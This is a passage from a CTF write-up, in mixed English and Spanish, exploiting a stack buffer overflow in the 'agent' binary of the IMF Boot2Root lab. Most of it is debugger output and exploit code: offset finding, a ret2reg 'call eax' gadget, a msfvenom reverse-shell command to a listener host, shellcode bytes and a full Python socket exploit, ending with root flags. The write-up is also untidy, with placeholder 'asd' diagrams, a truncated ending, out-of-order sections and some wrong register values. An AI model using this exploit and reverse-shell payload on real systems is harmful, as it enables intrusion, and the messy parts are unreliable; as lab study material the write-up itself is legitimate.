0xffffd404│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd408│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd40c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
──────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "agent", stopped 0x41414141 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```
Here we have the ability to analyze everything in more detail because just by looking at this, we can see what we overwrote, both the eip $eip : 0x41414141 ("AAAA"?) and the ebp $ebp : 0x41414141 ("AAAA"?).

So, the idea is to measure in order to use the EIP as we want, right?

Well, we simply create a pattern using the same tool, which is called gef, to insert that pattern into the ESP or stack, and then count how many characters we need to add until we reach the EIP or instruction pointer.

For this, we will play with a parameter called "pattern create"

```bash 
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak

```

Now the idea is to add this pattern to the binary input, instead of the A's we add the pattern in order to determine the values of EIP and EBP. Then we run the program with gdb as we did before to check the values using gef.

so first of all execute ```gdb agent -q``` after  ```r``` to run the program ```3``` to select the field that has the vulnerability ```input``` finally here we have to add our pattern create

output
```bash 
$eax   : 0xffffd344  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x0       
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd3f0  →  "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"
$ebp   : 0x62616171 ("qaab"?)
$esi   : 0xf7fa7000  →  0x001e4d6c
$edi   : 0xf7fa7000  →  0x001e4d6c
$eip   : 0x62616172 ("raab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd3f0│+0x0000: "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"	← $esp
0xffffd3f4│+0x0004: "taabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacga[...]"
0xffffd3f8│+0x0008: "uaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaacha[...]"
0xffffd3fc│+0x000c: "vaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaacia[...]"
0xffffd400│+0x0010: "waabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacja[...]"
0xffffd404│+0x0014: "xaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaacka[...]"
0xffffd408│+0x0018: "yaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaacla[...]"
0xffffd40c│+0x001c: "zaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616172
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "agent", stopped 0x62616172 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
now as we can see the value of  ```$eip``` is ```0x62616171```, ```("qaab"?)``` 

and the value of ``` esp``` is  : ```0xffffd3f0  →  "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"```

A graphical representation would be 

```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+-----+-----+----+
| aaaabaaacaaadaaaeaaafaaagaaahaaaia |\x61\x61\x62\x74\x61\|\x71\x61\x61\x62| 
+------------------------------------+---------------------+----+-----+-----+
```
where $eip is equal to 0x62616171 ("qaab"?) which in hexadecimal would be \x71\x61\x61\x62

And the ESP holds all of this: $esp: 0xffffd3f0 -> "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]", which in hexadecimal would be \x61\x61\x62\x74\x61\....


So the idea now is to ask gef how many characters are needed to reach the eip.

We'll do this with pattern offset. For example:

```bash
gef➤  pattern offset $eip
[+] Searching for '$eip'
[+] Found at offset 168 (little-endian search) likely
gef➤  

```
Then it tells us that we have to enter 168 characters to reach EIP, we could corroborate it by doing a one-liner in Python3.

Multiplying values as we know EIP's value is 4 because in gef we saw 4 characters, do you remember? ("qaab"?)

then we will tell it to multiply 168 because those are the ones we need to reach EIP, then multiply 4 B to write in the EIP and then let's multiply 100 c's because it's always good to know where other values are stored, in this case we will put 100 c's

```bash 
❯ python3 -c 'print ("A"*168 + "B"*4 + "C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Now the idea is to run the program again, so we would have to quit gdb and run it again to input our pattern offset created with python

```bash 
gef➤  quit
```
so first of all execute ```gdb agent -q``` after  ```r``` to run the program ```3``` to select the field that has the vulnerability ```input``` finally here we have to add our pattern create

output
```bash
$eax   : 0xffffd344  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x0       
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd3f0  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7fa7000  →  0x001e4d6c
$edi   : 0xf7fa7000  →  0x001e4d6c
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd3f0│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
0xffffd3f4│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd3f8│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd3fc│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd400│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd404│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd408│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd40c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "agent", stopped 0x42424242 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

So, as we can see it's correct, and we can even represent it graphically to make it clearer. The idea is that eax contains our A's because that direction seems that did change when we add input 

and C now holds the stack, we already know where everything is located.


$eax   : 0xffffd344  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"

eip equals BBBB

$eip   : 0x42424242 ("BBBB"?)

$esp   : 0xffffd3f0  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"


```bash 
 
 Eax     |    ESP                      |       EBP           | EIP
+--------+-----------------------------+---------------------+------+-----+
| AAAAAAA|CCCCCCCCCCCCCCCCCCCCCCCCCCCCC|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
+--------+-----------------------------+---------------------+------+-----+
```
The idea now is to deal with the randomization aspect due to the ASLR (Address Space Layout Randomization) feature.

ASLR explanation 

When ASLR is enabled, the memory layout of a program is randomized each time it is executed, so that the addresses of key areas of memory, such as the stack, heap, and libraries, will be different each time. This means that the address of a particular function or variable in memory will not be the same across multiple runs of the program.

This presents a challenge for attackers, because they must now find the location of key areas of memory through trial and error, rather than simply exploiting a predictable memory layout. However, ASLR is not foolproof, and there are still techniques that attackers can use to bypass it, such as brute-force attacks or information leaks.

Overall, ASLR is an important security feature that helps make it more difficult for attackers to exploit vulnerabilities in a program. nevertheless here in this example we will destroy it and instead of making us difficult to explote ASLR we will take advantage of it 

le't me explain you how we will take advantage of it 

first in the last example we saw that eax direction did not change too much and the ASLR is activated 

let's verify vamos a buscar colisiones esto con el fin de hacer un retret

primero que todo debemos tener en cuenta que Eax equivale a 32 bits entonces si yo le pregunto a gef por una cadena del 1 al 32 de eax es valido ya que eax tiene un valor de 32 bits basicamente en este ejemplo
hariamos un cat y el output pues seria el de eax asi de facil pero para que sepas aqui en gdb uno puede ver mas registros supongamos que queremos ver lo hay -4 espacios de eax o sea le hariamos un cat a eax menos 4 entonces como en esta caso usamos gbd en lugar de cat le podemos decir  x/32 $eax-4 enntonces me mostrara un output menos 4 espacios antes del eax 

entonces si yo busco por x32$eax entonces le estoy diciendo ponme todo eax para verificar donde se estan almacenando lo valores recordemos que si encontramos algo como \x41 es A y 
```bash 
y como sabemos \x41 es A 
y como sabemos \x42 es B 
y como sabemos \x43 es C 
```
entonces si vemos un output asi ya sabriamos identificarlo 

y mira hablando de eso, encontramos A's
```bash 
gef➤  x/32 $eax
0xffffd344:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd354:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd364:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd374:	0x41414141	0x41414141	0x41414141	0x41414141
```
si retrosedo -4 espacios usando eax como referencia entonces podriamos ver otros registros 
```bash
gef➤  x/16 $eax-4
0xffffd340:	0x804b02c	0x41414141	0x41414141	0x41414141
0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
```
esto es solo para mostrarte a mas detalle donde se almacenan los registros no te me confundas ahora vamos a ver como solucionamos la aleatorizacion
entonces la idea es 

ldd agent

le podrias hacer un ldd para ver las librerias compartidas y vemos 

y si luego filtrasmos con grep con libc 

y luego filtramos con awk para quedarnos con el ultimo argumento de el output y luego le borras los parentisis o sea 

ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'

while true; do ldd agent  | grep libc; done | grep " "

pero si luego verificamos el ASLR como trabaja
haciendo una secuencia del 1 al 19

for i in $(seq 1 19); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
output 

```bash
❯ for i in $(seq 1 19); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
0xf7d2c000
0xf7da1000
0xf7dc0000
0xf7d00000
0xf7d63000
0xf7d8b000
0xf7d95000
0xf7cf6000
0xf7d86000
0xf7cf5000
0xf7d60000
0xf7d86000
0xf7d04000
0xf7d96000
0xf7d2e000
0xf7d8b000
0xf7d81000
0xf7cc4000
0xf7d7e000
```
aqui podemos ver que a causa del ASLR la memoria cambia pues si agarramos cualquier valor del output que nos dio ese filtro podemos volver a filtrar usando ese output que seleccionamos yo voy a agarrar el primero 
o sea este ```0xf7d2c000```

while true; do ldd agent | grep libc; done | grep "0xf7d2c000"

y como vemos hay colisiones 

```bash
❯ while true; do ldd agent | grep libc; done | grep "0xf7d2c000"
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
```
hay colisiones ya que hay veces que la memoria vale lo mismo 

pero ese ataque se llama BOF [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) 

aqui vamos a explotar el ret2reg 

aunque si falla simplemente podriamos hacer un re2libc que es el bufferoverflow + un ataque de fuerza bruta como vimos que hay colisiones en la memoria o sea hay veces que la memoria repite, entonces podriamos de aprovecharnos de eso enviando la solicitud del bufferoverflow tantas veces que alguna de ellas va a calzar con la colicion de la memoria 

si a ti te falla aqui esta bien explicado [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) esto lo hice para tener varias opciones en caso de que veamos un bof pero esto pasa porque el binario es de 32 bits verdad si tu tienes un binario que no sea de 32 bits cambia la cosa 
porque esta contenido dentro del binario el eax ret2reg

bueno como dije vamos a explotar un ret2reg que en resumen es como hay aleatorizacion en la memoria nosotros tendriamos que apuntar a un lugar donde no cambie entonces 

```bash
with /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm >  
```
entonces mira

si el eax esta en el inicio del programa entonces podriamos hacer un ataque de bof ret2reg

en un ataque ret2reg nosotros prodiamos decirle a el Eip que apunte al eax si eax se encuentra al inicio del programa y luego seguiria mi shell code porque seguiria el esp entonces por ende me interpretaria el shell code

y aqui vemos que eax si esta al inicio y luego seguiria esp donde meteria mi shell code porque le diria a eip ok apuntame a eax que seria lo que esta antes de mi shell code 

```bash
gef➤  x/16 $eax-4
0xffffd340:	0x804b02c	0x41414141	0x41414141	0x41414141
0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141

```
esto seria eax ```0x804b02c``` pero vamos a buscarlo con nsashell haciendo un call eax 


entonces como dijimos vamos a usar esta herramienta 

```bash 
❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > call eax
00000000  FFD0              call eax
nasm > Interrupt: use the 'exit' command to quit
nasm > exit

```
entonces el call eax en ensamblador seria FF D0 si nosotros tomamos esa direcccion y la filtramos usando ubjet dump -D mas el binario podrimos ver la direccion de eax 



```bash 
❯ objdump -D agent | grep "FF D0" -i
 8048563:	ff d0                	call   *%eax

```
como podemos ver la direccion de eax seria ```8048563```


entonces lo que seguiria seria hacer un script con un shellcode de 168 bits con metasploit

```bash 
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
buf =  b""
buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"

```

aqui tendriamos que revisar si el binario que nos hizo metasploit vale 168 que es lo que vale eip recordemos que eip es el que manda 


y en el mismo output dice aqui ```Payload size: 95 bytes```

pero recordemos que para usar el eip necesitamos 168 o sea nos faltan 73 la idea es que te copies esto 

```bash 
buf =  b""
buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"

```


luego vamos a tomar ese script y hacer otro script pero ya manual


lo vamos a hacer en python




y aqui agregamos los valores encontrados 
cuales 
seria el offset de eip que seria 168  entonces 


```bash 
#!usr/bin/python3

offset = 168

```
seria el shellcode 
```bash 
#!usr/bin/python3

offset = 168

#Shellcode -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f py -v shellcode

buf =  b""
buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
```
vamos a definir los 73 que nos faltan 

```bash 
#!usr/bin/python3

offset = 168

#Shellcode -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f py -v shellcode

buf =  b""
buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"

buf += b"A"*(offset-len(buf))

print (len(buf))

```

le diremos que nos printee buf a ver cuanto es para verificar que toodo esta bien 


```bash 
❯ python3 machinecode.py
168

````

y si todo esta bien eliminemos el print y todo estaria bien 

lo que seguiria seria la llamada a eax

el salto siempre va a ser al reves recordemos que el salto a eax seria ```8048563```

entonces la idea es agreagarlo a el script ```buf += b"\x63\x85\x04\08" #8048563```

```bash 
#!usr/bin/python3

offset = 168

#Shellcode -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f py -v shellcode

buf =  b""
buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"

buf += b"A"*(offset-len(buf))

buf += b"\x63\x85\x04\08" #8048563
```

ahora la idea es jugar con socket para conectarse al programa y al puerto 7788 donde se esta ejecutando el agent  pero acordemonos que hay que poner un id code y presionar el 3 

primero vamos a definir un descriptor de archivo =s 

socket.socket(socket.AF_INET, socket.SOCK_STREAM) porque es una conexion por tcp  a donde ?

pues nos queremos connectar al localhost porque aqui es donde se esta ejecutando el agent 

s.connect(('127.0.0.1'))
por cua puerto ?

s.connect(('127.0.0.1, 7788))

con esto solo nos conectamos verdad pero recordemos que hay que darle un id y luego un enter y  luego un 3 y luego un enter y luego enviar el code 

entonces nos vamos a aprovechar de descriptor de archivo para enviar la data  que me intertesa seria

s.send que quieres enviar la data bueno seria (b"48093572") y ahora meteriamos un linefit que funciona como enter entonces seria

s.send(b"48093572\n") 

seria bueno corroborar a ver si nos loggea 

esto lo hariamos con print y recordemos que siempre que recibimos datos hay que decirle al programa que recibimos datos = data = s.recv(1024) 

data = s.recv(1024) 

print data

y vemos que si 

```Login validated```
ahora borramos print ya que no vale la pena hacer eso solo lo usamos para ver si nos loggeaba 


ahora hay que darle al 3 no ? entonces seria s.send(b"3") y luego igual jugamos con un line fit \n s.send(b"3\n")

luego recibimos datos 

data = s.recv(1024) 

y ahora si enviamos la cadena buf 

s.send (buf) pero recordemos que cuando colocabamos las A's habia que darle al enter entonces debemos editar  buf este buf buf += b"\x63\x85\x04\08" #8048563

entonces seria 

```bash 
       │ File: exploit.py
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/python3
   2   │ 
   3   │ import socket
   4   │ 
   5   │ offset = 168
   6   │ 
   7   │ buf =  b""
   8   │ buf += b"\xd9\xf6\xb8\x7d\xf9\xd3\x7f\xd9\x74\x24\xf4\x5b"
   9   │ buf += b"\x29\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x13\x03\x3e"
  10   │ buf += b"\xea\x31\x8a\xf1\xd7\x41\x96\xa2\xa4\xfe\x33\x46"
  11   │ buf += b"\xa2\xe0\x74\x20\x79\x62\xe7\xf5\x31\x5c\xc5\x85"
  12   │ buf += b"\x7b\xda\x2c\xed\xbb\xb4\xab\xd8\x53\xc7\x33\x23"
  13   │ buf += b"\x1f\x4e\xd2\x93\x39\x01\x44\x80\x76\xa2\xef\xc7"
  14   │ buf += b"\xb4\x25\xbd\x6f\x29\x09\x31\x07\xdd\x7a\x9a\xb5"
  15   │ buf += b"\x74\x0c\x07\x6b\xd4\x87\x29\x3b\xd1\x5a\x29"
  16   │ 
  17   │ 
  18   │ #padding
  19   │ 
  20   │ buf += b"A"*(offset-len(buf))
  21   │ 
  22   │ buf += b"\x63\x85\x04\x08\n" # 8404654651
  23   │ 
  24   │ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  25   │ s.connect(('127.0.0.1', 7788))
  26   │       
  27   │ s.send(b"48093572\n")
  28   │ data = s.recv(1024)
  29   │ s.send(b"3\n")
  30   │ data = s.recv(1024)
  31   │ s.send(buf)
───────┴──────────────────

````
who ami 

```bash 
cat Flag.txt
flag6{R2gwc3RQcm90MGMwbHM=}
```
cat

```bash 
❯ echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo ""
Gh0stProt0c0ls

```
last flag

```bash 
cat TheEnd.txt
   ____                        _ __   __   
  /  _/_ _  ___  ___  ___ ___ (_) /  / /__ 
 _/ //  ' \/ _ \/ _ \(_-<(_-</ / _ \/ / -_)
/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/ 
   __  __/_/        _                      
  /  |/  (_)__ ___ (_)__  ___              
 / /|_/ / (_-<(_-</ / _ \/ _ \             
/_/__/_/_/___/___/_/\___/_//_/             
  / __/__  ___________                     
 / _// _ \/ __/ __/ -_)                    
/_/  \___/_/  \__/\__/                     
                                           
Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
Thank you for trying this challenge and please send any feedback.

Geckom
Twitter: @g3ck0ma
Email: geckom@redteamr.com
Web: http://redteamr.com

Special Thanks
Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
Web Advice: Menztrual (@menztrual)
Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)
root@imf:/root# 

```


a la direccion a la que lo queremos enviar y vear si nos tramita una direccion ip 

aja y que mas pues como el code que hicimos en metasploit esta hehco para que envie una traza a el puerto 443 

entonces di vamos a ponernos en escucha del puerto 443 entonces se supone que si root esta ejeecutando este programa me daria una reverseshell al puerto 443 

esperemos a ver porque nosotros no lo sabemos pero aun asi vimo un usuario que se llama setup talvez usando este usuario podriamos ganar acceso pero vamos a hacerlo a ver si funka



luego tendriamos que hacer la llamada




entonces lo suyo seria buscar donde comienza eax y con esto podemos usar 
output 
```bash 
nasm > call eax
00000000  FFD0              call eax
nasm > 
```

now with object dump we will 


with objdump 
```bash 
objt dump -D agent | grep "FF D0" -i
```




asd
```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+------+-----+
| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
+------------------------------------+---------------------+------+-----+
```
asd

```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+------+-----+
| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
+------------------------------------+---------------------+------+-----+
```
asd


```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+------+-----+
| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
+------------------------------------+---------------------+------+-----+
```
asd


```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+------+-----+
